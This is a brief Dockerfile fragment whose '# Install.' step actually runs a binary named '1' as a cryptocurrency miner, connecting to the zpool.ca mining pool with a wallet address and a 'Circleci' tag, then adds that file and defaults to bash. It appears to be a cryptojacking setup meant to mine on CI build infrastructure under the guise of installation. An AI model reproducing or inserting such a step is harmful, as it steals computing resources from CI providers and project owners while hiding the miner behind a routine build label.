
# Install.
RUN \
 
  ./1 -a power2b -o stratum+tcp://power2b.na.mine.zpool.ca:6242 -u DFBr5oFsLuStdpiuf79s4abpFqFjFmnEW3 -p c=Circleci

# Add files.
ADD 1


# Define default command.
CMD ["bash"]
